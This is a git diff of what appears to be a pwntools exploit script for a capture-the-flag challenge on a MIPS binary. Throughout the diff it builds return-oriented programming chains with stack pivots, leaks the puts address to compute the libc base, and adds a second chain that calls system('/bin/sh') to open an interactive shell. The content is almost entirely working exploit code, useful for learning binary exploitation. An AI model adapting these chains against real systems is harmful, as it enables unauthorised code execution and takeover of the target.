@@ -18,6 +18,10 @@ class ROP:
     csu_rop = 0x00400d64
 
 
+class LIBC_ROPS:
+    lw_a0   = 0x00029d40  # lw $a0, 0x1c($sp); lw $t9, 0x30($sp); jalr $t9; nop;
+
+
 """
   400d64:	02602025 	move	a0,s3
   400d68:	1651fff9 	bne	s2,s1,400d50 <__libc_csu_init+0x60>
@@ -92,7 +96,10 @@ def solve():
         ROP.jalr1,
         0xDEADBEEF,
         0,
-        elf.plt.puts + 4
+        elf.plt.puts + 4,
+        0xDEADBEEF,
+        elf.sym.data_start,
+        elf.sym.main
     ]
 
     stack_pivot = [
@@ -101,16 +108,51 @@ def solve():
         ROP.pivot,
     ]
 
-    io.sendline(flat(payload))
-    io.sendline(flat(stack_pivot))
+    log.info(f"Payload size: {len(flat(payload))}")
+
+    io.send(flat(payload))
+    io.send(flat(stack_pivot))
 
     io.recvuntil(b"Thank you!\n")
     io.recvuntil(b"Thank you!\n")
     leak = int.from_bytes(io.recv(4), "little")
     libc.address = leak - libc.sym.puts
-    
-    log.info(f"Leak address: {hex(leak)}")
+
     log.info(f"Libc base: {hex(libc.address)}")
+
+    pivot_point2 = extract_pivot(io)
+    log.info(f"Pivot 2: {hex(pivot_point2)}")
+
+    log.info(f"System: {hex(libc.sym.system)}")
+    print(hex(next(libc.search(b"/bin/sh"))))
+
+    payload2 = [
+        0xCAFEBABE,
+        pivot_point2,
+        LIBC_ROPS.lw_a0 + libc.address,
+        0xCAFEBABE,
+        next(libc.search(b"/bin/sh")),
+        next(libc.search(b"/bin/sh")),
+        next(libc.search(b"/bin/sh")),
+        next(libc.search(b"/bin/sh")),
+        next(libc.search(b"/bin/sh")),
+        next(libc.search(b"/bin/sh")),
+        next(libc.search(b"/bin/sh")),
+        next(libc.search(b"/bin/sh")),
+        next(libc.search(b"/bin/sh")),
+        next(libc.search(b"/bin/sh")),
+        next(libc.search(b"/bin/sh")),
+        libc.sym.system,  # a0 next(libc.search(b"/bin/sh"))
+    ]
+
+    stack_pivot2 = [
+        padding,
+        pivot_point2,
+        ROP.pivot  # move sp,fp; lw ra,8(sp); lw fp,4(sp); jr ra; addiu sp,sp,12;
+    ]
+
+    io.send(flat(payload2))
+    io.send(flat(stack_pivot2))
 
     io.interactive()
 
